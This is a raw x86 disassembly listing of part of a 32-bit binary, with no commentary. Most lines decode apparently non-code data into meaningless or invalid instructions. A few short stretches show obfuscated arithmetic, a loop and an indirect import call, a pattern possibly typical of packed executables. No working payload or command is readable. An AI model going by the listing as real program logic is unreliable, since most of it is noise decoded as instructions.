  4062c1:	push   esi
  4062c2:	sbb    ebp,DWORD PTR [edx]
  4062c4:	test   eax,0x6f6304c2
  4062c9:	ja     0x40631a
  4062cb:	xchg   edx,eax
  4062cc:	cmp    ecx,DWORD PTR [ecx+0x26a23b19]
  4062d2:	sbb    eax,0x87cc511b
  4062d7:	addr16 retf 0x6c74
  4062db:	pop    edi
  4062dc:	sbb    al,0xe2
  4062de:	mov    al,BYTE PTR [ebx]
  4062e0:	leave  
  4062e1:	hlt    
  4062e2:	int3   
  4062e3:	bnd je 0x406336
  4062e6:	in     al,dx
  4062e7:	scas   al,BYTE PTR es:[edi]
  4062e8:	int    0x5a
  4062ea:	out    0x34,al
  4062ec:	or     ebx,DWORD PTR [edx-0x691ae090]
  4062f2:	inc    edi
  4062f3:	mov    ah,0x48
  4062f5:	int    0x56
  4062f7:	push   esi
  4062f8:	fwait
  4062f9:	aas    
  4062fa:	cli    
  4062fb:	in     eax,dx
  4062fc:	xor    eax,0xa4b52235
  406301:	enter  0x2a6a,0x79
  406305:	fild   DWORD PTR [edx]
  406307:	scas   al,BYTE PTR es:[edi]
  406308:	daa    
  406309:	pop    ecx
  40630a:	(bad)
  40630d:	jmp    DWORD PTR [ebx+0x14]
  406310:	das    
  406311:	xchg   edi,eax
  406312:	mov    cs,ecx
  406314:	ret    0x621a
  406317:	xor    DWORD PTR [ebx+0x29a9dbcf],0xb37247
  406321:	add    al,0x38
  406323:	inc    esp
  406324:	pop    edi
  406325:	mov    ch,0x69
  406327:	inc    edi
  406328:	cld    
  406329:	sub    bl,BYTE PTR [esi]
  40632b:	and    eax,0x9676d601
  406330:	pop    eax
  406331:	jmp    0x80a5d7da
  406336:	sbb    bl,al
  406338:	mov    esi,0x67207e4c
  40633d:	iret   
  40633e:	ds sahf 
  406340:	cmp    DWORD PTR ds:0xe7d851e3,ecx
  406346:	xchg   ebp,eax
  406347:	out    0xf8,eax
  406349:	sbb    eax,0xe3e107b2
  40634e:	dec    eax
  40634f:	fcom   DWORD PTR [ebx]
  406351:	fdivr  QWORD PTR [ebx+0x5330169d]
  406357:	pop    esi
  406358:	push   ebx
  406359:	stc    
  40635a:	sub    bh,bl
  40635c:	push   ss
  40635d:	xor    bl,ch
  40635f:	cld    
  406360:	cmp    ebp,ebx
  406362:	adc    DWORD PTR [ebp-0x1f],ebx
  406365:	dec    eax
  406366:	sub    eax,0xcdf179b1
  40636b:	xor    DWORD PTR [ebp+ecx*8-0x48],0x2c
  406370:	shr    BYTE PTR [ebx-0x22],1
  406373:	data16 icebp 
  406375:	dec    ebp
  406377:	pop    edi
  406378:	push   esi
  406379:	add    DWORD PTR [esi-0x1d],esi
  40637c:	mov    ah,dl
  40637e:	fcom   QWORD PTR [esi]
  406380:	(bad)  
  406381:	mov    ch,0xc0
  406383:	ret    
  406384:	(bad)  
  406385:	cwde   
  406386:	fwait
  406387:	daa    
  406388:	mov    esi,0xc569e049
  40638d:	fadd   DWORD PTR [edx-0x38]
  406390:	xor    eax,DWORD PTR [ebx]
  406392:	fs call 0x531b5bd4
  406398:	leave  
  406399:	mov    esp,DWORD PTR [ebp+esi*1+0x612a13d2]
  4063a0:	jle    0x4063a5
  4063a2:	sbb    eax,0x9a0be120
  4063a7:	jb     0x406418
  4063a9:	mov    ?,WORD PTR [eax]
  4063ab:	stc    
  4063ac:	xchg   DWORD PTR [ecx-0x29],ebx
  4063af:	icebp  
  4063b0:	pop    ss
  4063b1:	inc    edx
  4063b2:	inc    ecx
  4063b3:	shl    BYTE PTR [eax+0x604d6bf3],cl
  4063b9:	pop    ecx
  4063ba:	cld    
  4063bb:	mov    ecx,0x550d2863
  4063c0:	int    0xcd
  4063c2:	cdq    
  4063c3:	pop    es
  4063c4:	sbb    ebp,esp
  4063c6:	jns    0x4063b0
  4063c8:	jb     0x406359
  4063ca:	stos   DWORD PTR es:[edi],eax
  4063cb:	inc    esi
  4063cc:	shl    BYTE PTR cs:[ebp-0x3849031b],0xea
  4063d4:	mov    edi,0x499f51c2
  4063d9:	xchg   edx,eax
  4063da:	xchg   ecx,eax
  4063db:	jo     0x406371
  4063dd:	or     al,0x6d
  4063df:	clc    
  4063e0:	int    0x65
  4063e2:	rcl    DWORD PTR [edx],0xa6
  4063e5:	sub    al,0x6e
  4063e7:	add    esi,ebx
  4063e9:	adc    ah,BYTE PTR [esi-0x73]
  4063ec:	jle    0x4063f4
  4063ee:	(bad)  
  4063ef:	mov    WORD PTR [ebp+0x27ae4733],gs
  4063f5:	adc    al,0x85
  4063f7:	sub    bh,BYTE PTR [ecx+0x2e]
  4063fa:	adc    al,0xba
  4063fc:	stos   DWORD PTR es:[edi],eax
  4063fd:	rcl    BYTE PTR [eax+ebp*1+0x7d],0x2
  406402:	mov    ch,0x85
  406404:	cmp    eax,0xdde78a22
  406409:	aam    0xc9
  40640b:	jno    0x406408
  40640d:	push   edx
  40640e:	sub    al,0x98
  406410:	nop
  406411:	sbb    ebx,DWORD PTR [edx+0x49]
  406414:	nop
  406415:	jmp    0x929e8233
  40641a:	jp     0x406415
  40641c:	pushf  
  40641d:	fmul   st,st(6)
  40641f:	shl    DWORD PTR [esi-0x55],0x29
  406423:	arpl   WORD PTR [esi+ebp*4],dx
  406426:	iret   
  406427:	sub    BYTE PTR [eax-0x35f8bb70],dh
  40642d:	hlt    
  40642e:	fwait
  40642f:	ins    DWORD PTR es:[edi],dx
  406430:	les    esi,FWORD PTR [ecx+0x497e8a3f]
  406436:	jo     0x40649e
  406438:	lea    edi,[edi]
  40643a:	test   BYTE PTR fs:[edx],al
  40643d:	jle    0x4064ba
  40643f:	sbb    eax,0xe111e81e
  406444:	dec    ebx
  406445:	shl    BYTE PTR [edi+eiz*1],0xdb
  406449:	dec    ebx
  40644a:	add    DWORD PTR [ebx-0x35],ecx
  40644d:	mov    ebx,DWORD PTR [ecx]
  40644f:	add    al,0x2b
  406451:	cdq    
  406452:	lods   al,BYTE PTR ds:[esi]
  406453:	inc    edx
  406454:	xchg   ebx,eax
  406455:	sbb    eax,0x9826c40
  40645a:	dec    esi
  40645b:	sbb    BYTE PTR [ecx-0x46],0xee
  40645f:	xchg   ecx,eax
  406460:	inc    ebx
  406461:	pop    ecx
  406462:	cmp    DWORD PTR [ebp+0x12],ebp
  406465:	(bad)  
  406467:	add    BYTE PTR [eax],ah
  406469:	test   BYTE PTR [esi],al
  40646b:	mov    bl,0xd
  40646d:	pop    esp
  40646e:	jo     0x4063f2
  406470:	(bad)  
  406471:	jne    0x40640b
  406473:	mov    bl,0xb4
  406475:	xor    BYTE PTR ds:0x9bf9d044,ah
  40647b:	mov    ch,0xd1
  40647d:	outs   dx,BYTE PTR ds:[esi]
  40647e:	push   ss
  40647f:	jb     0x40646e
  406481:	jns    0x406473
  406483:	in     eax,dx
  406484:	fcomip st,st(2)
  406486:	cdq    
  406487:	daa    
  406488:	xchg   ebx,eax
  406489:	lahf   
  40648a:	loopne 0x406430
  40648c:	outs   dx,DWORD PTR ds:[esi]
  40648d:	and    DWORD PTR [edx-0x76],0xffffffd1
  406491:	mov    fs,WORD PTR [edi]
  406493:	sbb    BYTE PTR [ecx-0x774a236d],bl
  406499:	dec    ebx
  40649b:	out    dx,al
  40649c:	hlt    
  40649d:	(bad)  
  40649e:	lods   al,BYTE PTR ds:[esi]
  40649f:	pop    esp
  4064a0:	inc    esp
  4064a1:	xchg   esi,eax
  4064a2:	hlt    
  4064a3:	cmp    al,0xe5
  4064a5:	pop    edi
  4064a6:	inc    ecx
  4064a7:	outs   dx,BYTE PTR ds:[esi]
  4064a8:	mov    eax,0x61dc641c
  4064ad:	shl    DWORD PTR [eax+0xc],0x56
  4064b1:	(bad)  
  4064b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064b3:	mov    eax,DWORD PTR [ecx]
  4064b5:	pop    ss
  4064b6:	inc    edi
  4064b7:	icebp  
  4064b8:	lds    edi,FWORD PTR [edx+0x14]
  4064bb:	loope  0x406527
  4064bd:	sub    al,0xac
  4064bf:	or     DWORD PTR [edx],edx
  4064c1:	jmp    0x40652a
  4064c3:	jae    0x40645c
  4064c5:	push   es
  4064c6:	dec    edi
  4064c7:	imul   esp,edi,0xffffff83
  4064ca:	dec    edi
  4064cb:	adc    al,0x34
  4064cd:	loop   0x4064d6
  4064cf:	fldenv [esi+eiz*8-0x3e]
  4064d3:	cmp    dh,BYTE PTR [ebx+0x58fffef2]
  4064d9:	in     eax,dx
  4064da:	xchg   esi,eax
  4064db:	int    0xca
  4064dd:	repz push esi
  4064df:	jae    0x40652a
  4064e1:	leave  
  4064e2:	mov    bh,BYTE PTR [eax-0x42e349ec]
  4064e8:	or     bl,0x9c
  4064eb:	sbb    eax,0xc12ab607
  4064f1:	mov    ds:0xd9b6eda,al
  4064f6:	(bad)  
  4064f7:	out    0x6,eax
  4064f9:	xor    BYTE PTR [eax-0x17],bl
  4064fc:	mov    ds:0x4450f486,eax
  406501:	mov    ebx,0x4bb05f3a
  406506:	and    edx,DWORD PTR [ebx]
  406508:	pop    esp
  406509:	int3   
  40650a:	mov    ebx,0x18b48238
  40650f:	out    0x79,al
  406511:	cli    
  406512:	sbb    edx,eax
  406514:	push   esi
  406515:	lods   al,BYTE PTR ds:[esi]
  406516:	cmp    BYTE PTR [edx-0x5d],dh
  406519:	fdiv   QWORD PTR [ecx-0x74]
  40651c:	lea    ecx,[eax+0x3f]
  40651f:	in     eax,dx
  406520:	jne    0x406565
  406522:	pop    eax
  406523:	fimul  WORD PTR ds:0x5e6683ae
  406529:	mov    ch,0x59
  40652b:	sbb    bh,bh
  40652d:	test   eax,0x41d11ec7
  406532:	pop    es
  406533:	popf   
  406534:	xchg   edx,eax
  406535:	aam    0x11
  406537:	push   cs
  406538:	into   
  406539:	xchg   ecx,eax
  40653a:	pop    ebx
  40653b:	dec    esi
  40653c:	or     eax,0x8b4e52d8
  406541:	cmp    eax,0xc9c73f5a
  406546:	xor    eax,0x956362d4
  40654b:	cs sbb al,0x5f
  40654e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40654f:	ja     0x4065ce
  406551:	js     0x40655f
  406553:	fsubr  QWORD PTR [eax+0x8e96f03]
  406559:	shr    DWORD PTR [ecx-0x799c90c7],1
  40655f:	scas   eax,DWORD PTR es:[edi]
  406560:	dec    esp
  406561:	mov    BYTE PTR [esi-0x25e0ccce],bh
  406567:	pop    edi
  406568:	sbb    esi,0xffffff81
  40656b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40656c:	pop    ebp
  40656d:	inc    esp
  40656e:	sub    DWORD PTR [edi+0x37],0x66
  406572:	sbb    DWORD PTR [ebx],ebx
  406574:	pop    edx
  406575:	push   edx
  406576:	daa    
  406577:	mov    dl,0x4e
  406579:	mov    al,ds:0xa61ede64
  40657e:	cli    
  40657f:	je     0x406534
  406581:	mov    edi,0x3b64bb5
  406586:	jbe    0x4065e3
  406588:	mov    ah,ch
  40658a:	(bad)  
  40658b:	iret   
  40658c:	stos   DWORD PTR es:[edi],eax
  40658d:	jge    0x4065b1
  40658f:	sub    esi,DWORD PTR [esi]
  406591:	addr16 sbb al,0x83
  406594:	or     edi,DWORD PTR [edx+0x6f]
  406597:	mov    ds:0xc4e65b7,eax
  40659c:	push   0x86c99956
  4065a1:	or     al,0x8d
  4065a3:	inc    ebp
  4065a4:	fmul   QWORD PTR [edi]
  4065a6:	mov    bh,0xd
  4065a8:	mov    ebx,0x23004345
  4065ad:	or     eax,0x4344f3
  4065b2:	mov    DWORD PTR ds:0x4345bb,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x4344ff,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43460f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x4344f7,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x43454f,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x4344eb,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x4344eb
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x4344eb,ecx
  4065fa:	cmp    DWORD PTR ds:0x4344eb,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x434547
  40660f:	push   0x43481f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x4344eb,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	dec    ebp
  406639:	fdivr  QWORD PTR [ecx+0x7e3b4c5d]
  40663f:	jle    0x406690
  406641:	jns    0x4066c1
  406643:	jle    0x406616
  406645:	out    dx,al
  406646:	pop    ebp
  406647:	mov    eax,0xf9379966
  40664c:	sub    DWORD PTR [eax+0x39acee1e],0xa93a68a6
  406656:	das    
  406657:	adc    al,0x9d
  406659:	xchg   edi,eax
  40665a:	sbb    eax,0x4a51906c
  40665f:	or     ah,BYTE PTR ds:0xe60bc3ff
  406665:	add    al,0x1e
  406667:	enter  0x6bf6,0xe5
  40666b:	ds cld 
  40666d:	aam    0x66
  40666f:	jbe    0x406651
  406671:	mov    edx,0x9f7caa7a
  406676:	jne    0x406670
  406678:	mov    dh,0xbd
  40667a:	mov    ebx,0x9f72b918
  40667f:	xchg   BYTE PTR [esi+0xd],ah
  406682:	scas   al,BYTE PTR es:[edi]
  406683:	push   ecx
  406684:	loop   0x40667b
  406686:	mov    edx,DWORD PTR [edx+0x7dda1582]
  40668c:	test   eax,0x8e137d63
  406691:	(bad)  
  406692:	aad    0x1f
  406694:	in     al,0x86
  406696:	inc    edi
  406697:	int    0x49
  406699:	(bad)  
  40669b:	pusha  
  40669c:	dec    edi
  40669d:	mov    edx,0xe77e2c9
  4066a2:	addr16 push edi
  4066a4:	out    0x79,eax
  4066a6:	mov    ecx,DWORD PTR [ebp-0x444d466c]
  4066ac:	inc    esi
  4066ad:	sbb    edi,DWORD PTR [eax-0x5f1559ef]
  4066b3:	les    eax,FWORD PTR [edi-0x2a5ce5ae]
  4066b9:	fstp   TBYTE PTR [edx]
  4066bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066bc:	aam    0xdc
  4066be:	lahf   
  4066bf:	dec    ebx
  4066c0:	mov    DWORD PTR [eax],edx
  4066c2:	inc    edi
  4066c3:	gs aad 0x89
  4066c6:	add    DWORD PTR [eax+0x33bd8d5f],ebp
  4066cc:	jmp    0x406690
  4066ce:	cmc    
  4066cf:	retf   0xa117
  4066d2:	out    0xd4,al
  4066d4:	and    dl,BYTE PTR [ecx]
  4066d6:	or     al,0x24
  4066d8:	fcmovnbe st,st(3)
  4066da:	mov    ds:0xa22dba5f,eax
  4066df:	scas   eax,DWORD PTR es:[edi]
  4066e0:	xchg   esp,eax
  4066e1:	ss (bad) 
  4066e3:	pop    ecx
  4066e4:	cld    
  4066e5:	mov    al,ds:0xba82de94
  4066ea:	into   
  4066eb:	ret    
  4066ec:	jo     0x4066c5
  4066ee:	jp     0x4066f2
  4066f0:	mov    DWORD PTR [edi+0x5f61ba1b],ebp
  4066f6:	in     al,0x8d
  4066f8:	mov    DWORD PTR [ebp+0x48847269],edx
  4066fe:	enter  0x2115,0xc9
  406702:	push   eax
  406703:	imul   ecx,DWORD PTR [esp+ecx*4],0x5600184a
  40670a:	(bad)  
  40670b:	call   0xa93:0xa00d1e19
  406712:	and    eax,ebp
  406714:	pop    es
  406715:	xchg   ebx,eax
  406716:	in     eax,dx
  406717:	cmp    DWORD PTR [edx+0x23],0xaef9a9fb
  40671e:	sahf   
  40671f:	dec    eax
  406720:	jnp    0x4066e0
  406722:	or     BYTE PTR [eax],0xc8
  406725:	xchg   esi,eax
  406726:	cmp    eax,0x7283e51f
  40672b:	mov    dl,0x75
  40672d:	nop
  40672e:	jns    0x406760
  406730:	mov    DWORD PTR es:[edx-0x58],edx
  406734:	fist   WORD PTR [ebx]
  406736:	inc    edi
  406737:	aaa    
  406738:	dec    esi
  406739:	cwde   
  40673a:	shr    ebx,0x8d
  40673d:	iret   
  40673e:	jmp    0x3678ba44
  406743:	add    DWORD PTR [ecx-0x61],edx
  406746:	mov    al,ds:0x89faae64
  40674b:	inc    esp
  40674c:	outs   dx,DWORD PTR ds:[esi]
  40674d:	push   ebx
  40674e:	cmp    BYTE PTR [edx+eax*8-0x21818802],dh
  406755:	lahf   
  406756:	mov    ds:0x62047d76,eax
  40675b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40675c:	mov    DWORD PTR [ebp+0x35],ebp
  40675f:	jbe    0x406771
  406761:	mov    bh,BYTE PTR [esi-0x4d]
  406764:	dec    edi
  406765:	mov    edi,0xb609c21b
  40676a:	popa   
  40676b:	jle    0x40675a
  40676d:	(bad)  
  40676e:	cmc    
  40676f:	dec    esi
  406770:	arpl   WORD PTR [eax+0x6],bx
  406773:	xor    al,0x11
  406775:	inc    esi
  406776:	pop    edx
  406777:	mov    eax,0xff712fc
  40677c:	ja     0x406730
  40677e:	sti    
  40677f:	sub    al,0xea
  406781:	or     eax,0xc28a5322
  406786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406787:	mov    ecx,0xba2c3ee0
  40678c:	adc    ch,ah
  40678e:	out    0x16,al
  406790:	popf   
  406791:	fwait
  406792:	cli    
  406793:	dec    edx
  406794:	jne    0x4067ec
  406796:	mov    fs,WORD PTR [ebx+ebx*8+0x5e6ddc33]
  40679d:	jmp    0x406745
  40679f:	push   ebp
  4067a0:	jecxz  0x4067c9
  4067a2:	or     bh,BYTE PTR ds:0xed56c3b2
  4067a9:	jmp    0x406828
  4067ab:	js     0x40679c
  4067ad:	dec    eax
  4067ae:	in     al,0x14
  4067b0:	mov    ds:0x108675ff,eax
  4067b5:	sbb    DWORD PTR [ebp-0x30],0xbcd1141e
  4067bc:	popa   
  4067bd:	push   0x74
  4067bf:	js     0x40675f
  4067c1:	add    al,0x3e
  4067c3:	aad    0x24
  4067c5:	add    BYTE PTR [edi-0x5c],cl
  4067c8:	loop   0x4067f3
  4067ca:	(bad)  
  4067cb:	icebp  
  4067cc:	adc    eax,0xcbf35611
  4067d1:	mov    esi,ebx
  4067d3:	sbb    DWORD PTR [ecx-0x77af197],edx
  4067d9:	or     DWORD PTR [ebp-0x54a5a57f],eax
  4067df:	loop   0x40681e
  4067e1:	nop
  4067e2:	mov    esi,0xab76948
  4067e7:	jge    0x406812
  4067e9:	inc    edx
  4067ea:	cli    
  4067eb:	xchg   ebx,eax
  4067ec:	ja     0x4067a9
  4067ee:	aam    0xae
  4067f0:	(bad)  
  4067f1:	or     ebp,eax
  4067f3:	add    al,dh
  4067f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067f6:	lds    esi,FWORD PTR [ecx+0x13]
  4067f9:	out    0x19,eax
  4067fb:	jg     0x406859
  4067fd:	jns    0x4067a6
  4067ff:	nop
  406800:	push   ebp
  406801:	dec    ebp
  406802:	stos   DWORD PTR es:[edi],eax
  406803:	mov    BYTE PTR [esi+ebx*8-0x6a74bfae],al
  40680a:	pop    esi
  40680b:	out    dx,al
  40680c:	sar    BYTE PTR [ebp-0x5f125074],1
  406812:	dec    edi
  406813:	dec    eax
  406814:	lds    ebp,FWORD PTR [ecx+0x6d]
  406817:	ds (bad) 
  406819:	push   esp
  40681a:	imul   esp,ecx,0xfbff3e4d
  406820:	push   ss
  406821:	xor    ecx,ebx
  406823:	gs xor al,0x69
  406826:	mov    eax,ds:0xea9d856d
  40682b:	popf   
  40682c:	lea    edx,[edx+0x79e608a0]
  406832:	bound  esi,QWORD PTR [edx+ebx*2]
  406835:	jg     0x406892
  406837:	sbb    eax,0x69bc0936
  40683c:	and    ch,al
  40683e:	das    
  40683f:	xor    DWORD PTR [esi+0x25],ebp
  406842:	cmp    eax,0x63a17a36
  406847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406848:	mov    ds:0x69d4989f,eax
  40684d:	xor    al,0x6d
  40684f:	repz sub BYTE PTR [esi-0x9c5195b],cl
  406856:	imul   ebp,edx,0xffffff85
  406859:	shl    BYTE PTR [ebp+0x54],1
  40685c:	mov    al,0xac
  40685e:	jmp    0x4068c9
  406860:	pop    ebp
  406861:	dec    eax
  406862:	iret   
  406863:	sbb    al,BYTE PTR [ebx+0x643f0714]
  406869:	call   0xa6:0x50841932
  406870:	add    BYTE PTR [ecx-0x70],ah
  406873:	pop    ss
  406874:	inc    edx
  406875:	repz int 0xcc
  406878:	dec    ah
  40687a:	cmp    bl,BYTE PTR [ebp+0xd7020cf]
  406880:	pop    esi
  406881:	test   eax,0xf147788d
  406886:	clc    
  406887:	dec    esp
  406888:	mov    eax,ds:0xe91669d9
  40688d:	in     al,dx
  40688e:	cdq    
  40688f:	cmp    al,0x4c
  406891:	fldenv [edi+0x4d]
  406894:	mov    dh,0x67
  406896:	iret   
  406897:	xor    DWORD PTR [edi+0x3e732d1f],ebx
  40689d:	scas   eax,DWORD PTR es:[edi]
  40689e:	leave  
  40689f:	mov    ds:0xb9e9c24,eax
  4068a4:	and    DWORD PTR [edx],0xdae83439
  4068aa:	stos   DWORD PTR es:[edi],eax
  4068ab:	rcl    DWORD PTR [edx+0x79],0xc1
  4068af:	mov    ds:0xc1b38f79,eax
  4068b4:	mov    ah,0x1c
  4068b6:	adc    eax,0x7bcb6fde
  4068bb:	jmp    0x75b6e37c
  4068c0:	call   DWORD PTR [edx-0xe7e597e]
  4068c6:	pop    esp
  4068c7:	data16 (bad) 
  4068c9:	push   ebp
  4068ca:	pop    ebp
  4068cb:	jmp    0x4068bd
  4068cd:	popa   
  4068ce:	fwait
  4068cf:	mov    eax,0x21bc657c
  4068d4:	sbb    al,0x38
  4068d6:	nop
  4068d7:	repz inc eax
  4068d9:	in     al,dx
  4068da:	xchg   ebx,eax
  4068db:	jp     0x406925
  4068dd:	add    al,0x5a
  4068df:	sub    ah,BYTE PTR [edx-0x54]
  4068e2:	rol    edi,cl
  4068e4:	bound  esp,QWORD PTR [eax+0x404a990f]
  4068ea:	int3   
  4068eb:	cld    
  4068ec:	loopne 0x406922
  4068ee:	cld    
  4068ef:	jnp    0x4068c6
  4068f1:	xor    bh,bl
  4068f3:	sar    BYTE PTR [esi+0x45],0x5
  4068f7:	jns    0x4068de
  4068f9:	mov    dl,0x12
  4068fb:	jbe    0x40689d
  4068fd:	mov    esi,0x5faec48a
  406902:	dec    ebp
  406903:	inc    eax
  406904:	ror    DWORD PTR [edx+0x64320115],0xb1
  40690b:	jl     0x40696a
  40690d:	cmp    DWORD PTR [ebx*4-0x5110b78],0x71b11868
  406918:	enter  0x535c,0xd2
  40691c:	fdivr  DWORD PTR [esi+0x5f]
  40691f:	cmp    al,0x30
  406921:	sub    DWORD PTR [ebx],ecx
  406923:	adc    dl,ah
  406925:	bound  ebp,QWORD PTR es:[eax]
  406928:	mov    al,ds:0x9cde5384
  40692d:	mov    ds:0x2568e08c,eax
  406932:	mov    ds:0xfba08aa3,al
  406937:	les    esi,FWORD PTR [edi+ebx*8]
  40693a:	retf   0x3195
  40693d:	rol    BYTE PTR [edx],0x7e
  406940:	jns    0x40698c
  406942:	sub    DWORD PTR [eax+0x24],esp
  406945:	sti    
  406946:	push   es
  406947:	fwait
  406948:	aaa    
  406949:	out    dx,al
  40694a:	or     al,0x66
  40694c:	call   0xe3148290
  406951:	call   0xbec5ba73
  406956:	call   0x1dcd:0xb817d73c
  40695d:	add    BYTE PTR [eax+eiz*2-0x6b],dl
  406961:	push   ebp
  406962:	retf   0x22cd
  406965:	push   eax
  406966:	jnp    0x4069c1
  406968:	aas    
  406969:	push   edx
  40696a:	xchg   bh,ch
  40696c:	jg     0x406993
  40696e:	nop
  40696f:	bound  edi,QWORD PTR ds:0x378e0785
  406975:	and    DWORD PTR gs:[edx+0x3f],edx
  406979:	jbe    0x4069ce
  40697b:	dec    esp
  40697c:	je     0x4069ed
  40697e:	push   ss
  40697f:	inc    edx
  406980:	call   0xf690a0a4
  406985:	aad    0xc6
  406987:	test   DWORD PTR [ebx+0x15],eax
  40698a:	pop    eax
  40698c:	dec    edx
  40698d:	push   ds
  40698e:	test   al,0x84
  406990:	and    WORD PTR [ebx-0x79],sp
  406994:	call   0x488b660f
  406999:	call   0xc2ceb142
  40699e:	jg     0x406942
  4069a0:	test   eax,0x9f6986dc
  4069a5:	dec    ecx
  4069a6:	ins    DWORD PTR es:[edi],dx
  4069a7:	popf   
  4069a8:	test   BYTE PTR [ebx+0x18b8ae76],0xb7
  4069af:	inc    esp
  4069b0:	ins    BYTE PTR es:[edi],dx
  4069b1:	test   al,0x63
  4069b3:	call   0xb8ed3ac5
  4069b8:	jmp    0x406958
  4069ba:	addr16 mov ebp,0xcf248c03
  4069c0:	ja     0x4069c5
  4069c2:	cmc    
  4069c3:	ror    DWORD PTR [ebp+0x28],0x31
  4069c7:	push   ds
  4069c8:	xor    dl,BYTE PTR [ecx]
  4069ca:	scas   al,BYTE PTR es:[edi]
  4069cb:	jno    0x406971
  4069cd:	push   ds
  4069ce:	inc    ebx
  4069cf:	mov    esp,0x5b0dd55b
  4069d4:	sbb    ebx,edx
  4069d6:	sub    al,0x18
  4069d8:	and    ebp,eax
  4069da:	mov    al,ds:0xd48afc75
  4069df:	push   ds
  4069e0:	imul   esp,edx,0x7d
  4069e3:	and    DWORD PTR [ecx-0x5b],esp
  4069e6:	mov    ebx,0x30800f09
  4069eb:	mov    al,ds:0x6c61f4f3
  4069f0:	xor    al,0xf0
  4069f2:	js     0x4069cf
  4069f4:	xchg   edx,eax
  4069f5:	push   cs
  4069f6:	mov    ebx,edx
  4069f8:	sub    esp,DWORD PTR [edx+0x4a]
  4069fb:	cmp    DWORD PTR [ebx],ebx
  4069fd:	out    dx,eax
  4069fe:	test   ebp,ecx
  406a00:	sahf   
  406a01:	or     al,0xbc
  406a03:	mov    gs,edx
  406a05:	in     eax,dx
  406a06:	(bad)  
  406a08:	pop    es
  406a09:	(bad)  
  406a0a:	fild   DWORD PTR [ebp+0x37]
  406a0d:	and    BYTE PTR [edi],dl
  406a0f:	leave  
  406a10:	cli    
  406a11:	mov    DWORD PTR [edi+0x5756bb19],edi
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434583,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x4344fb
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x43453b,0x4345f7
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x4344df,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x434537,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0xc52bc4eb,eax
  406a76:	(bad)  
  406a77:	popf   
  406a78:	(bad)  
  406a79:	jle    0x406af9
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406a5c
  406a80:	and    al,0x86
  406a82:	dec    edx
  406a83:	cli    
  406a84:	ret    
  406a85:	adc    eax,0x69195b1e
  406a8a:	inc    ecx
  406a8b:	push   esp
  406a8c:	add    BYTE PTR [ecx-0x472282cf],ch
  406a92:	sub    al,0x4c
  406a94:	pop    edi
  406a95:	jb     0x406a21
  406a97:	push   ss
  406a98:	fimul  DWORD PTR [edx-0x3c]
  406a9b:	mov    esi,0x2dae5080
  406aa0:	dec    esp
  406aa1:	xor    dh,BYTE PTR [esi-0x46]
  406aa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aa5:	xor    BYTE PTR ds:0x73944f58,al
  406aab:	fimul  DWORD PTR [ecx]
  406aad:	mov    ch,cl
  406aaf:	pop    edi
  406ab0:	sbb    cl,BYTE PTR [ebx]
  406ab2:	clc    
  406ab3:	inc    eax
  406ab4:	xor    bl,BYTE PTR [eax+0x737dc79c]
  406aba:	std    
  406abb:	pushf  
  406abc:	jl     0x406b2c
  406abe:	cdq    
  406abf:	out    dx,eax
  406ac0:	int    0x8a
  406ac2:	leave  
  406ac3:	sub    bh,BYTE PTR [edi-0x3d]
  406ac6:	cmp    al,0xdf
  406ac8:	test   eax,0xaa707124
  406acd:	jae    0x406ab0
  406acf:	or     DWORD PTR [eax-0x4c],esi
  406ad2:	sub    eax,0x9ed10e42
  406ad7:	add    DWORD PTR ds:0xc76bba06,ecx
  406add:	and    al,0x4b
  406adf:	stc    
  406ae0:	iret   
  406ae1:	ds popa 
  406ae3:	pop    ecx
  406ae4:	outs   dx,BYTE PTR ds:[esi]
  406ae5:	xor    edx,DWORD PTR [edi+0x2035ca57]
  406aeb:	add    ebp,esi
  406aed:	pop    ds
  406aee:	xchg   ecx,eax
  406aef:	imul   eax,DWORD PTR [ebx-0x3420cf2a],0xf625dbed
  406af9:	or     DWORD PTR [esi+0x5de921dc],0x16791e17
